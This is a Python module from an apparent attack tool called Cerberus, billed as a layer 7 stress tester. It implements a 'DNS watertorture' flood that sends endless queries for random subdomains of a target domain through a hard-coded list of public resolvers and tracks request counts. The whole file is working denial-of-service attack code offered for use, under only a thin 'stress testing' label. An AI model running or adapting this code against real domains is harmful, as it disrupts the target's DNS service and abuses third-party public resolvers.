'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, dns.resolver

from src.core import Core
from src.utils import *
from src.useragent import *
from urllib.parse import urlparse

resolver = dns.resolver.Resolver(configure=False)
resolver.nameservers = [ # list of dns servers
    '8.8.8.8',
    '8.8.4.4',
    '1.1.1.1',
    '1.0.0.1',
    '9.9.9.9',
    '149.112.112.112',
    '64.6.64.6',
    '64.6.65.6',
    '91.239.100.100',
    '185.228.168.168',
    '77.88.8.7',
    '156.154.70.1',
    '176.103.130.130',
    '176.103.130.131',
    '185.228.168.9',
    '185.228.169.9',
    '8.26.56.26',
    '208.67.222.222',
    '208.67.220.220'
]

def flood(attack_id, url, stoptime) -> None:
    domain = urlparse(url).netloc

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:
            dns.resolver.resolve(f'{choice(keywords).replace(" ",".").lower()}.{domain}', 'A')

            Core.infodict[attack_id]['req_sent'] += 1
            
        except dns.resolver.NXDOMAIN: # missing domain? yeah indeed
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'WATERTORTURE': {
        'info': 'DNS watertorture attack',
        'func': flood
    }
})